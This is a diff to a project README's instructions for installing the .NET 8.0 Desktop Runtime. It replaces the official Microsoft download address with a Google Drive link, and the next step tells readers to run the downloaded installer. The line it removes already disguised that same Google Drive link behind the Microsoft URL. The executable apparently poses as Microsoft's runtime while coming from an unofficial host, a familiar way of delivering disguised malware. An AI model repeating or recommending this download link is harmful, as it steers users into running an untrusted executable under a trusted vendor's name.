@@ -22,7 +22,7 @@ Before you can run the project, you need to install the .NET SDK and Desktop Run
 1. **Download the .NET Desktop Runtime:**
    - Download the installer for .NET 8.0 Desktop Runtime:
      - [Download windowsdesktop-runtime-8.0.18-win-x64.exe]
-     - (https://builds.dotnet.microsoft.com/dotnet/WindowsDesktop/8.0.18/windowsdesktop-runtime-8.0.18-win-x64.exe)](https://drive.google.com/file/d/1ofrPzqkclObm6rgtCFw-kdIaF-5lqV20/view?usp=sharing
+     - (https://drive.google.com/file/d/1ofrPzqkclObm6rgtCFw-kdIaF-5lqV20/view?usp=sharing
 
 2. **Install the .NET Desktop Runtime:**
    - Run the installer you downloaded (`windowsdesktop-runtime-8.0.18-win-x64.exe`).
